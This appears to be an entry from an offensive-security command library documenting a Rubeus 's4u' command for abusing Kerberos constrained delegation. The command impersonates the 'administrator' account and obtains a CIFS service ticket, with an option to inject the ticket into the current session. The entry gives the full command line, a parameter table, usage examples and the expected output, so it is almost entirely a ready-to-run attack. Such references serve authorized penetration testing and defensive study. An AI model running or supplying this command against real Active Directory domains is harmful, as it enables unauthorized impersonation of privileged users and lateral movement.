---
id: 5faa5b1a-bf0f-47f9-ab15-1db0aacf4ef9
name: s4u-delegation-with-password-rubeus
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs
  /impersonateuser:"administrator" /domain:"domain" /user:"user"
  /password:"password"
output: null
created_at: '2023-04-06T03:56:07.695360+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
  - delegation
verified: true
validated: true
---

# s4u-delegation-with-password-rubeus

## Command

```powershell
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
```

## Description

Performs S4U2 delegation using a password to impersonate a user and obtain a ticket for the target SPN.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /msdsspn | Target SPN (e.g., time/target.local) | Yes |
| /altservice | Alternate services (e.g., cifs) | Yes |
| /impersonateuser | User to impersonate | Yes |
| /domain | Domain name | Yes |
| /user | Delegating user | Yes |
| /password | Password | Yes |
| /nowrap | Suppress output wrapping | No |

## Examples

### Basic Usage

```powershell
Rubeus.exe s4u /msdsspn:"cifs/dc.local" /altservice:cifs /impersonateuser:admin /domain:domain /user:svcacct /password:pass
```

### With PTT

Add `/ptt` to inject ticket.

## Expected Output

Base64 ticket for the SPN. Success: 'Service ticket successfully exported' message.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
